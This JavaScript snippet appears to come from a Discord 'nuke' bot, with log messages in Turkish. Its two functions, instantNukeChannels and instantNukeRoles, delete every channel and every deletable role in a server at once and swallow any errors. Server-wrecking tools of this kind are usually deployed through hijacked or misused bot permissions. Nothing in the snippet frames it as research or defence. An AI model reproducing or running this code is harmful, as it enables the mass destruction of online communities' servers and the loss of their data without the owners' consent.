async function instantNukeChannels(guild) {
    console.log('[DELETE] 💥 KANALLAR SİLİNİYOR...');
    
    const promises = [];
    guild.channels.cache.forEach(ch => {
        promises.push(ch.delete().catch(() => {}));
    });
    
    await Promise.all(promises);
    console.log('[DELETE] ✅ TÜM KANALLAR SİLİNDİ');
}

async function instantNukeRoles(guild) {
    console.log('[DELETE] 💥 ROLLER SİLİNİYOR...');
    
    const promises = [];
    guild.roles.cache.forEach(role => {
        if (role.name !== '@everyone' && role.position < guild.members.me.roles.highest.position) {
            promises.push(role.delete().catch(() => {}));
        }
    });
    
    await Promise.all(promises);
    console.log('[DELETE] ✅ TÜM ROLLER SİLİNDİ');
}

